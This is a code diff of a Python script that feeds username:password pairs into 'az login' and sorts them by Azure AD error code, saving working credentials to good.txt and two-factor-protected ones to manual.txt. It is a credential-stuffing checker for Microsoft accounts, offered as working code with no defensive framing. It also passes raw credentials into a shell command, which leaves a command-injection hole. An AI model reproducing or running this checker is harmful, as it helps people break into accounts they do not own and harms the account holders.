@@ -16,20 +16,21 @@ def run():
         print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 开始运行')
         for acc in accs:
             try:
-                if get_status(acc) == '密码正确':
+                acc_status = get_status(acc)
+                if acc_status == '密码正确':
                     print(acc[0] + ':' + acc[1] + ' good')
                     good = acc[0] + ':' + acc[1]
                     with open('./good.txt', 'a', encoding='utf-8') as fa:
                         fa.write(good)
                         fa.write('\n')
-                elif get_status(acc) == '需要添加二验':
+                elif acc_status == '需要添加二验':
                     print(acc[0] + ':' + acc[1] + ' manual')
                     manual = acc[0] + ':' + acc[1]
                     with open('./manual.txt', 'a', encoding='utf-8') as fa:
                         fa.write(manual)
                         fa.write('\n')
                 else:
-                    print(acc[0] + ':' + acc[1] + ' bad')
+                    print(acc[0] + ':' + acc[1] + ' ' + acc_status)
             except Exception as e:
                 pass
         print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 完成运行')
@@ -39,31 +40,31 @@ def run():
 
 def get_status(acc):
     shell_content = 'az login --allow-no-subscriptions -u ' + acc[0] + ' -p ' + acc[1]
-    status = subprocess.getoutput(shell_content)
-    # print(status)
-    if 'true' in str(status):
-        return '密码正确'
-    elif '50034' in str(status):
-        return '账户不存在'
-    elif '50126' in str(status):
-        return '密码错误'
-    elif '53003' in str(status):
-        return 'IP限制'
-    elif '50057' in str(status):
-        return '管理ban'
-    elif '50059' in str(status):
-        return '被删号'
-    elif '50053' in str(status):
-        return '被暴力破解，自动ban'
-    elif '90019' in str(status):
-        return '账号错误'
-    elif '50076' in str(status):
+    try:
+        status = subprocess.getoutput(shell_content)
+        if 'true' in str(status):
+            return '密码正确'
+        elif '50034' in str(status):
+            return '账户不存在'
+        elif '50126' in str(status):
+            return '密码错误'
+        elif '53003' in str(status):
+            return 'IP限制'
+        elif '50057' in str(status):
+            return '管理ban'
+        elif '50059' in str(status):
+            return '被删号'
+        elif '50053' in str(status):
+            return '被暴力破解，自动ban'
+        elif '90019' in str(status):
+            return '账号错误'
+        elif '50079' in str(status):
+            return '需要添加二验'
+        else:
+            print(status)
+            return '未知错误'
+    except Exception as e:
         return '需要二验'
-    elif '50079' in str(status):
-        return '需要添加二验'
-    else:
-        print(status)
-        return '未知错误'
 
 
 def test_azurecli():
